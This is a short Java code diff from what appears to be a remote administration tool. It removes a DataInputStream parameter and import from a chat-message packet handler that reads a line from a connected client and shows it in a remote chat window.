@@ -8,13 +8,12 @@ import javax.swing.text.SimpleAttributeSet;
 import javax.swing.text.StyleConstants;
 import javax.swing.text.StyleContext;
 import java.awt.*;
-import java.io.DataInputStream;
 
 
 public class Packet35ChatMessage extends AbstractIncomingPacket {
 
 	@Override
-	public void read(Slave slave, DataInputStream dis) throws Exception {
+	public void read(Slave slave) throws Exception {
 		FrameRemoteChat frame = FrameRemoteChat.instances.get(slave);
 		String message = slave.readLine();
 		if (frame != null) {
